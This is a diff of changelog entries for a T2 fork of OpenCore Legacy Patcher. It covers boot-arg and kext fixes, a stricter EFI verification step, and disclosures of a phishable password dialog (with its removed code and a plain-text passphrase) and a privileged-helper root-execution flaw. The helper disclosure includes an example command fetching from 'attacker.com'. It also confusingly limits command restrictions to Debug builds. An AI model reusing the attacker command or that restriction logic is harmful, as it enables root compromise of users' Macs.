@@ -1,4 +1,118 @@
 # OpenCore Legacy Patcher T2 changelog / OpenCore Legacy Patcher T2-Änderungsprotokoll
+## 4.0.0.190007 - 4.0.0 alpha 19.7
+This release:
+- fixes a bug where `agdpmod=pikera` was injected for every AMD dGPU and for every MacBookPro14,3 variant. Polaris and Vega dGPUs need `agdpmod=vit9696` and could end up with a black screen. `pikera` is now only injected when a Navi dGPU is detected, both in the regular build and in the T2 boot-args. thx @Medelcartelinc (#467)
+- bundles SpoofVMM.kext (v4.9.0), thx @zkennedy137 and enables it on T2 Macs instead of the `revpatch=sbvmm` boot-arg, which has been removed from the T2 boot-args. T2 Macs now get SMBIOS spoofing (Automatic, UpdateSMBIOS, UpdateDataHub, UpdateNVRAM and CustomSMBIOSGuid), which SpoofVMM requires. thx @Medelcartelinc (#469) and @zkennedy137 for writing SpoofVMM and testing it on T2 Macs
+- adds BroadcomVTD-Tahoe.kext (v0.2.17) for legacy Broadcom Wi-Fi, enabled together with the existing IO80211FamilyLegacy patches. thx @Medelcartelinc (#476)
+- fixes a bug where `macserial` and `ocvalidate` were stored without the executable bit, so ZIP downloads and fresh clones failed Advanced SMBIOS spoofing with `PermissionError [Errno 13]`, and config validation would fail the same way.
+- adds a `--update-channel` flag to `Build-Project.command` and fixes it having no effect: the channel only reached the build process's environment, so every app fell back to the official channel. It is now embedded as `UpdateChannel` in the app's Info.plist and read at launch. A new build default replaces an earlier choice stored in the settings once; after that, the choice made in Settings wins again.
+- fixes a missing space in the message shown when cancelling an update.
+- fixes the following vulnerability:
+
+gui_build_verify.py:
+- in Verify Generated Build (TEST-B): the check only tested whether files with the expected names existed, so empty folders, zero-byte files or symlinks named like the required kexts passed. Missing kexts were only a warning and the result always said "Verification Complete.". Kexts were never checked against Kernel > Add (enabled, MinKernel/MaxKernel), boot-args were matched as substrings (`dart=0` also matched `dart=01`), AMD patches were only found by an exact-case "AMD" or "Polaris" in the patch comment, config.plist was parsed and hashed from two separate reads, and the folder checked was rebuilt from `launcher_script_location` instead of the folder the EFI builder actually writes to.
+
+Impact: a tampered or incomplete EFI, for example one with a swapped kext binary or a kext that never loads, could be reported as verified, giving false confidence before installing it. The verification now fails closed (PASSED / FAILED / incomplete spec), validates each kext as a real bundle with exactly one Kernel > Add entry active for the target kernel, checks Lilu load order and the IOSkywalkFamily block, matches boot-args as whole tokens and requires `boot-args` in NVRAM > Delete, hashes config.plist and the whole EFI folder from the same bytes, rejects symlinks and checks `opencore_release_folder`. Closing the window during verification no longer crashes the app. TEST-B expected values that are not set yet are reported as UNASSERTED instead of passing silently.
+
+## 4.0.0.19006.6 - 4.0.0 alpha 19.6.6
+**NOTICE:**
+
+The old OpenCore Legacy Patcher password prompt dialog is deprecated. DO NOT, under any circumstances enter your password into any of them starting with version `4.0.0.190006`. OCLPT2 now *only* uses Apple's official password prompt.
+
+This release:
+- fixes a bug where after the password mechanism has been changed, it was still appearing a popup where it says this: OpenCore Legacy Patcher could not unlock Universal-Binaries.dmg automatically. If macOS asks for a password for this disk image, the password is: password. Since 4.0.0.190006, this message has been already obsolete and now asks for the macOS password instead.
+- fixes the following vulnerability:
+
+          def _is_encrypted(self, dmg_path: Path) -> bool:
+                  """Whether hdiutil considers the image encrypted, ie. whether it will prompt for a passphrase at all.
+          
+                  Deliberately fail-open: if the check cannot be run or its wording changes,
+                  assume encrypted and show the notice. A superfluous notice is harmless,
+                  a missing one leaves the user staring at an unanswerable system prompt.
+                  assume encrypted and supply the passphrase anyway.
+                  """
+                  try:
+                      result = subprocess.run(
+                          ["/usr/bin/hdiutil", "isencrypted", str(dmg_path)],
+                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=30
+                      )
+                  except Exception as e:
+                      logging.error(f"- Failed to check if DMG is encrypted: {e}")
+                      logging.exception("Stack Trace:")
+                      return True
+                  output = result.stdout.decode(errors="ignore").lower()
+                  # hdiutil has printed both "encrypted: YES/NO" and "encrypted: 1/0" across releases.
+                  return not ("encrypted: no" in output or "encrypted: 0" in output)
+          
+              def _display_universal_binaries_password_notice(self) -> None: # <- the entire function here has a vulnerability where an attacker could set up a lookalike popup in a malicious script to trick the victim into granting the attacker root access, or worse, for phishing
+                  """Heads-up dialog shown before falling back to hdiutil's own passphrase prompt.
+          
+                  Only reached when the built-in passphrase did not unlock the image. hdiutil
+                  then asks for it through a bare macOS system prompt that names only the disk
+                  image and gives no indication of what to type, which reads like an
+                  unexplained password request in the middle of root patching. State the
+                  passphrase ourselves beforehand so the prompt is answerable.
+                  """
+                  if self.constants.cli_mode is True:
+                      return
+                  try:
+                      applescript.AppleScript(
+                          f'display dialog "OpenCore Legacy Patcher could not unlock Universal-Binaries.dmg automatically.\\n\\nIf macOS asks for a password for this disk image, the password is:\\n\\n{UNIVERSAL_BINARIES_PASSPHRASE}" buttons {{"OK"}} default button "OK" with title "OpenCore Legacy Patcher"{subprocess_wrapper.applescript_icon_clause(self.icon_path)}'
+                      ).run()
+                  except Exception as e:
+                      logging.error(f"- Failed to display Universal-Binaries.dmg password notice: {e}")
+
+Impact: an attacker could set up a malicious script with a lookalike popup that says OpenCore Legacy Patcher could not unlock Universal-Binaries.dmg automatically to trick the victim into granting the attacker root access via living-off-the-land techniques and phishing. Or worse, an attacker could intentionally fall back to the obsolete logic to launch phishing attacks and take over the victim's computer. This vulnerability has been fixed by removing the obsolete function  _display_universal_binaries_password_notice.
+
+## 4.0.0.19006.5 - 4.0.0 alpha 19.6.5
+**NOTICE:**
+
+The old OpenCore Legacy Patcher password prompt dialog is deprecated. DO NOT, under any circumstances enter your password into any of them starting with version `4.0.0.190006`. OCLPT2 now *only* uses Apple's official password prompt.
+
+This release:
+- fixes a bug where on T2 Macs gets injected CatalinaBCM5701Ethernet.kext while the Macs that really require this kext skip it, causing on T2 Macs to show an AppleKeyStore kernel panic while on the Macs that really need this kext for Ethernet to have 0 Ethernet at all.
+- now for downloading macOS installers, only the amount of space that the installer demands is required instead of 45GB, thx @gandolf243 
+
+## 4.0.0.19006.4 - 4.0.0 alpha 19.6.4
+This release fixes a bug where if the certificate of the Priveleged Helper Tool is invalid (e.g when running from source or a fork) and falls back to osascript, when building OpenCore EFI, the following error shows up:
+
+            Mounte Partition: disk0s6
+            Mounting partition: disk0s6
+            Privileged Helper Tool rejected this build (OCLP_PHT_ERROR_INVALID_CERTIFICATES), not using it for the rest of this session.
+            Checking hard disk type
+            Mounting the EFI partition
+            File operation failed during installation: encoding without a string argument
+            Stack Trace:
+            Traceback (most recent call last):
+              File "opencore_legacy_patcher/support/install.py", line 163, in install_opencore
+              File "opencore_legacy_patcher/support/subprocess_wrapper.py", line 714, in run_as_root_and_verify
+              File "opencore_legacy_patcher/support/subprocess_wrapper.py", line 292, in run_as_root
+              File "opencore_legacy_patcher/support/utilities.py", line 600, in get_admin_permission
+            TypeError: encoding without a string argument
+            Please try again later.
+
+## 4.0.0.19006.3 - 4.0.0 alpha 19.6.3
+This release:
+- fixes a bug where even when Disable AMFIPass is explicitly enabled in Settings, the patcher was still stripping out amfi=0x80 and that caused certain Macs to get stuck at a login loop when trying to sign in, thx @Medelcartelinc 
+- fixes a bug in the Priveleged Helper Tool  where when I was fixing a vulnerability that would let attackers execute arbitary code as root, in the mitigated code there was a bug, where the restriction of which commands are allowed to execute were also enforced on the release build, which at the end caused this error while trying to root patch:
+
+            Subprocess failed.
+                Command: ['/Library/PrivilegedHelperTools/com.albert-mueller.opencore-patcher-t2.privileged-helper', PosixPath('/var/folders/sf/89g8z5hs59g5r75hxfdkdg_r0000gp/T/tmpix_lubct/payloads/Tools/RSRRepair'), '--install']
+                Return Code: 171
+                    Likely Enum: OCLP_PHT_ERROR_COMMAND_NOT_ALLOWED
+                Standard Output:
+                    None
+                Standard Error:
+                    None
+
+This bug is fixed by enforcing the restrictions of which commands are allowed to be executed only on Debug builds. It was intended this restriction to be only for Debug builds.
+Previously prior to this patch, an attacker could execute any command (e.g curl -a attacker.com/malware) as root by abusing the Priveleged Helper Tool via living-off-the-land techniques.
+
+## 4.0.0.19006.2 - 4.0.0 alpha 19.6.2
+This release:
+- fixes AttributeError while trying to install root patches
+- now requires MacPorts to be installed to build the app; Homebrew requires Apple Silicon
+
 ## 4.0.0.19006.1 - 4.0.0 alpha 19.6.1
 This release:
 - fixes a bug where upon updating the patcher or switching forks via switching the update channel, it starts a repair upgrade even if the update has successfully installed
